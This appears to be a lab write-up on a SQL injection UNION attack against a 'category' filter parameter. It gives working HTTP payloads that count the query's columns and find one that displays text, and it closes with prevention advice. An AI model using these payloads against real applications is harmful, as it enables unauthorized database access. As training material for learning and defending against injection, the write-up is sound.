# SQL Injection UNION Attack - Finding a Column Containing Text

## Objective

Determine which column in the query can hold string data and display a supplied value in the response.

## Vulnerable Parameter

`category`

## Step 1: Determine the Number of Columns

Payload:

```http
GET /filter?category=Corporate+gifts' UNION SELECT NULL,NULL,NULL-- HTTP/2
```

Result:
- Success
- No error returned

Conclusion:
- The original query returns 3 columns.

## Step 2: Find a Column Compatible with String Data

### Test 1

Payload:

```http
GET /filter?category=Corporate+gifts' UNION SELECT 'abcdef',NULL,NULL-- HTTP/2
```

Result:
- Error returned

Conclusion:
- Column 1 is not compatible with string data.

### Test 2

Payload:

```http
GET /filter?category=Corporate+gifts' UNION SELECT NULL,'abcdef',NULL-- HTTP/2
```

Result:
- Success
- The value appeared in the application's response.

Conclusion:
- Column 2 accepts string data.

## Explanation

A UNION attack requires matching both:

1. The number of columns.
2. Compatible data types.

By testing different positions with a string value, it was possible to identify a column that accepts text and displays it in the response.

## Prevention

- Use parameterized queries.
- Avoid concatenating user input into SQL statements.
- Validate user input on the server side.
